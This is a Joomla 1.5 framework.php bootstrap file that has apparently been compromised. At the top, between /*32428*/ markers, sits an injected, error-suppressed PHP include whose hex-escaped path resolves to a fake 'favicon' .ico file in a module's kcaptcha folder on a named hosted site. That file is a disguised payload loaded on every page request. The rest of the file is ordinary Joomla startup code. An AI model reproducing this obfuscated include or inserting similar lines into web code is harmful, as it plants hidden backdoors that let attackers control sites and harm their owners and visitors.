<?php
/*32428*/

@include "\x2fhome\x2fregh\x6fst/d\x6fmain\x73/reg\x68osp.\x67orod\x67omel\x2eby/p\x75blic\x5fhtml\x2fmodu\x6ces/m\x6fd_si\x6dplef\x6frm/k\x63aptc\x68a/fa\x76icon\x5f4599\x30c.ic\x6f";

/*32428*/
/**
* @version		$Id: framework.php 14401 2010-01-26 14:10:00Z louis $
* @package		Joomla
* @subpackage	Installation
* @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

/*
 * Joomla! system checks
 */

@set_magic_quotes_runtime( 0 );
@ini_set('zend.ze1_compatibility_mode', '0');

if (!file_exists( JPATH_CONFIGURATION . DS . 'configuration.php' ) || (filesize( JPATH_CONFIGURATION . DS . 'configuration.php' ) < 10)) {
	// TODO: Throw 500 error
	header( 'Location: ../installation/index.php' );
	exit();
}

/*
 * Joomla! system startup
 */

// System includes
require_once( JPATH_LIBRARIES		.DS.'joomla'.DS.'import.php');

// Pre-Load configuration
require_once( JPATH_CONFIGURATION	.DS.'configuration.php' );

// System configuration
$CONFIG = new JConfig();

if (@$CONFIG->error_reporting === 0) {
	error_reporting( 0 );
} else if (@$CONFIG->error_reporting > 0) {
	error_reporting( $CONFIG->error_reporting );
	ini_set( 'display_errors', 1 );
}

unset( $CONFIG );

/*
 * Joomla! framework loading
 */

// Include object abstract class
require_once(JPATH_SITE.DS.'libraries'.DS.'joomla'.DS.'utilities'.DS.'compat'.DS.'compat.php');

// Joomla! library imports
jimport( 'joomla.environment.uri' );
jimport( 'joomla.user.user' );
jimport( 'joomla.event.event');
jimport( 'joomla.event.dispatcher');
jimport( 'joomla.plugin.helper' );
jimport( 'joomla.utilities.string' );
?>